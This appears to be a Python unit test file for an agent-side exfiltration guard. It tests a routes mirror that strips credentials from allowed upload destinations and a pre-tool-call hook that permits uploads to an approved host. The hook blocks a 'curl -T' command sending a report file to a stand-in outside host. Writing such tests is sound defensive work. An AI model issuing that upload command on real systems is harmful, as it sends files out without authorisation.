"""Routes mirror for the Desktop page: paths and allowed hosts only, never full patterns."""
from contextlib import closing
from tempfile import TemporaryDirectory
import unittest
from exfilbar.ledger import Ledger
from exfilbar.policy import Policy
from support import Context, entry

ROUTES = [{'paths': ['reports/**'], 'to': ['https://user:pw@uploads.example/reports/*?token=x']},
          {'paths': ['exports/*.csv'], 'to': ['backup@files.example:incoming/*', '*']}]


class RoutesPageTests(unittest.TestCase):
    def test_mirror_keeps_hosts_and_drops_paths_queries_and_credentials(self):
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory, clock=lambda: '2000-01-01T00:00:00+00:00')
            self.assertEqual(ledger.routes(), {'known': False, 'updated': None, 'routes': []})
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            result = ledger.routes()
            self.assertTrue(result['known'])
            self.assertEqual(result['routes'], [
                {'position': 1, 'paths': ['reports/**'], 'hosts': ['uploads.example']},
                {'position': 2, 'paths': ['exports/*.csv'], 'hosts': ['files.example', '*']}])
            text = repr(result)
            for secret in ('pw', 'token', 'incoming', 'backup@'):
                self.assertNotIn(secret, text)

    def test_unchanged_routes_do_not_rewrite_and_empty_routes_are_known(self):
        with TemporaryDirectory() as directory:
            times = iter(['2000-01-01T00:00:00+00:00', '2000-01-02T00:00:00+00:00', '2000-01-03T00:00:00+00:00'])
            ledger = Ledger(directory, clock=lambda: next(times))
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            self.assertEqual(ledger.routes()['updated'], '2000-01-01T00:00:00+00:00')
            ledger.publish_routes(Policy().routes)
            self.assertEqual(ledger.routes(), {'known': True, 'updated': '2000-01-02T00:00:00+00:00', 'routes': []})

    def test_register_publishes_routes_and_hook_decisions_are_unchanged(self):
        module = entry()
        ctx = Context(routes=ROUTES[:1])
        module.register(ctx)
        self.assertEqual(module.Ledger().routes()['routes'][0]['hosts'], ['uploads.example'])
        hook = ctx.hooks['pre_tool_call']
        self.assertIsNone(hook('terminal', {'command': 'curl -T reports/weekly.csv https://uploads.example/reports/weekly.csv'}, session_id='s'))
        self.assertEqual(hook('terminal', {'command': 'curl -T reports/weekly.csv https://elsewhere.example/up'}, session_id='s')['action'], 'block')

    def test_mirror_failure_never_changes_a_decision(self):
        module = entry()
        ctx = Context(routes=ROUTES[:1])
        def broken(self, routes):
            raise OSError('disk full')
        original = module.Ledger
        module.Ledger = lambda: type('L', (original().__class__,), {'publish_routes': broken})(original().directory)
        module.register(ctx)
        hook = ctx.hooks['pre_tool_call']
        self.assertIsNone(hook('terminal', {'command': 'curl -T reports/weekly.csv https://uploads.example/reports/weekly.csv'}, session_id='s'))


if __name__ == '__main__':
    unittest.main()
